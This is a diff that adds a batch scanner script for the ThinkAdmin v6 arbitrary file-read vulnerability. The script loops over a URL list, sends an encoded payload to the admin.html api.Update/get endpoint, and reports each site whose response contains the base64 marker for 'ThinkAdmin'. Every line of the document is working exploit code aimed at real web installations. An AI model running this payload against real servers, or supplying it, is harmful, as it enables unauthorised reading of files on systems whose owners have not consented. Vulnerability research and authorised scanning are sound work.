@@ -1,0 +1,23 @@
+#request urls = array
+#define payload = /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34
+#define bug = VGhpbmtBZG1pbg
+#define info = thinkadmin-v6-readfile
+
+function main(args){
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+	
+}
